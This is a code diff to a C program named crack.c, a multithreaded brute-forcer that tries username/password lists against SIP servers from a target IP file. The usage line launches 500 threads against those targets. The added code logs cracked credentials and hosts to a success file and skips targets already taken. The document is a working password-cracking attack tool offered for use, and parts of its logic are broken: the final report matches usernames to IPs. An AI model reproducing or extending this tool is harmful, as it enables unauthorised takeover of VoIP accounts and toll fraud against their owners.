@@ -2,7 +2,7 @@ gcc crack.c -o crack -pthread
 ./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt
 
 =====================================
-ستعرض النتائج بعد الانتهاء من الكراك
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <getopt.h>
@@ -63,8 +63,11 @@ UserPass* read_user_pass(const char* filename, int* num_user_pass);
 void print_usage();
 int is_target_successful(const char* ip, int port);
 int is_credential_successful(const char* username, const char* password);
+int is_target_reserved(const char* ip, int port);
 void add_target_to_success(const char* ip, int port);
 void add_credential_to_success(const char* username, const char* password);
+void add_target_to_reservation(const char* ip, int port);
+void write_successful_attempts(const char* filename);
 void sip_crack(Target* target, UserPass* user_pass);
 void* thread_function(void* arg);
 
@@ -140,7 +143,17 @@ int is_credential_successful(const char* username, const char* password) {
     return 0;
 }
 
-// Function to add the target to the success list
+// Function to check if the target is reserved
+int is_target_reserved(const char* ip, int port) {
+    for (int i = 0; i < num_successful_targets; i++) {
+        if (strcmp(successful_targets[i].ip, ip) == 0 && successful_targets[i].port == port) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+// Function to add the target to the success list and update the success file
 void add_target_to_success(const char* ip, int port) {
     pthread_mutex_lock(&success_mutex);
     successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
@@ -148,9 +161,21 @@ void add_target_to_success(const char* ip, int port) {
     successful_targets[num_successful_targets].port = port;
     num_successful_targets++;
     pthread_mutex_unlock(&success_mutex);
+
+    // Open the success file in "a" (append) mode
+    FILE* file = fopen(success_file, "a");
+    if (!file) {
+        perror("Failed to open success file");
+        exit(EXIT_FAILURE);
+    }
+
+    // Write the successful attempt to the success file
+    fprintf(file, "SUCCESS: %s:%d\n", ip, port);
+
+    fclose(file);
 }
 
-// Function to add the credential to the success list
+// Function to add the credential to the success list and update the success file
 void add_credential_to_success(const char* username, const char* password) {
     pthread_mutex_lock(&success_mutex);
     successful_credentials = realloc(successful_credentials, sizeof(UserPass) * (num_successful_credentials + 1));
@@ -158,10 +183,65 @@ void add_credential_to_success(const char* username, const char* password) {
     strcpy(successful_credentials[num_successful_credentials].password, password);
     num_successful_credentials++;
     pthread_mutex_unlock(&success_mutex);
+
+    // Open the success file in "a" (append) mode
+    FILE* file = fopen(success_file, "a");
+    if (!file) {
+        perror("Failed to open success file");
+        exit(EXIT_FAILURE);
+    }
+
+    // Write the successful attempt to the success file
+    fprintf(file, "SUCCESS: %s:%s\n", username, password);
+
+    fclose(file);
+}
+
+// Function to add the target to the reservation list
+void add_target_to_reservation(const char* ip, int port) {
+    pthread_mutex_lock(&reservation_mutex);
+    successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
+    strcpy(successful_targets[num_successful_targets].ip, ip);
+    successful_targets[num_successful_targets].port = port;
+    num_successful_targets++;
+    pthread_mutex_unlock(&reservation_mutex);
+}
+
+// Function to write successful attempts to a file in the desired format
+void write_successful_attempts(const char* filename) {
+    FILE* file = fopen(filename, "w");
+    if (!file) {
+        perror("Failed to open success file");
+        exit(EXIT_FAILURE);
+    }
+
+    // Loop through successful targets and write them to the file
+    for (int i = 0; i < num_successful_targets; i++) {
+        // Write target ip:port
+        fprintf(file, "%s:%d ", successful_targets[i].ip, successful_targets[i].port);
+
+        // Find corresponding credentials for the target
+        for (int j = 0; j < num_successful_credentials; j++) {
+            if (strcmp(successful_credentials[j].username, successful_targets[i].ip) == 0 &&
+                atoi(successful_credentials[j].password) == successful_targets[i].port) {
+                // Write the username:password
+                fprintf(file, "%s:%s\n", successful_credentials[j].username, successful_credentials[j].password);
+                break;
+            }
+        }
+    }
+
+    fclose(file);
 }
 
 // Function to perform cracking for a specific target and user/pass combination
 void sip_crack(Target* target, UserPass* user_pass) {
+    // Check if the target is reserved
+    if (is_target_reserved(target->ip, target->port)) {
+        printf("Target %s:%d is reserved, skipping...\n", target->ip, target->port);
+        return;
+    }
+
     // Check if the target is successful and added to the success list
     if (is_target_successful(target->ip, target->port)) {
         printf("Target %s:%d is successful, skipping...\n", target->ip, target->port);
@@ -231,6 +311,7 @@ void sip_crack(Target* target, UserPass* user_pass) {
                 printf("Success: %s\n", buffer);
                 add_target_to_success(target->ip, target->port); // Add the target to the success list
                 add_credential_to_success(user_pass->username, user_pass->password); // Add the credential to the success list
+                add_target_to_reservation(target->ip, target->port); // Mark the target as reserved
                 break; // Break the loop if successful response is found
             }
         }
@@ -326,7 +407,8 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    // Cleanup
+    // Cleanup and write final successful attempts to the success file
+    write_successful_attempts(success_file);
     free(targets);
     free(user_passes);
     free(successful_targets);
@@ -334,3 +416,4 @@ int main(int argc, char* argv[]) {
 
     return EXIT_SUCCESS;
 }
+
